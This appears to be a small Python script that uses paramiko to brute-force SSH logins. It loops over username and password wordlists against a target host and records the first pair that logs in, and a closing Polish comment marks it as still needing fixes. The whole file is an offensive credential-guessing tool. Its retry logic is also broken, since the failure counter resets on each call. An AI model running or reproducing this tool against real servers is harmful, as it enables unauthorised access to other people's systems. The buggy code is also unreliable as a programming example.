import paramiko
import time

global FoundID,FoundPass,Error

def Connect(host, user, passwd):
    global FoundID,FoundPass,Error
    FoundID = ""
    FoundPass = ""
    Error = ""
    Fails = 0
    try:
        s = paramiko.SSHClient()
        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        s.connect(host, username=user, password=passwd)
        FoundID = user
        FoundPass = passwd
        return True
    except Exception as e:
        if Fails > 5:
            Error = "X"
            return True
        elif 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            return Connect(host, user, passwd)
        elif 'syncronize with origanal prompt' in str(e):
            time.sleep(1)
            return Connect(host, user, passwd)
        return False


def Main(host):
    result = False
    with open("Bazy/BazaID1.txt", 'r') as a, open("Bazy/BazaHa1.txt", 'r') as b:
            for line1 in a:
                if result == False:
                    user = line1.strip('\r\n')
                    b.seek(0)
                for line in b:
                    if result == False:
                        passwd = line.strip('\r\n')
                        result = Connect(host, user, passwd)


#skrypt do poprawy 0 1 2